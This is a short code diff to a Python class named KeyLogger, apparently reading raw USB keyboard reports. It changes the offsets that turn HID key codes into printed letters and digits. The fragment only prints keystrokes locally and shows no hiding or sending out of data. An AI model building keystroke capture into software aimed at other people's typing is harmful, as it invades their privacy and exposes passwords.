@@ -82,9 +82,9 @@ class KeyLogger:
             if data:
                 key_code = data[2]  # The key code is in byte 2
                 if key_code<30:
-                    char = chr(key_code+97)  # Convert the key code to a character
+                    char = chr(key_code+93)  # Convert the key code to a character
                 elif 30 <=key_code and key_code <40:
-                    char = chr(key_code + 18)
+                    char = chr(key_code + 19)
                 print(f"Key pressed: {key_code} ({char})")
         # device =self.__find_device()
         # if device is None:
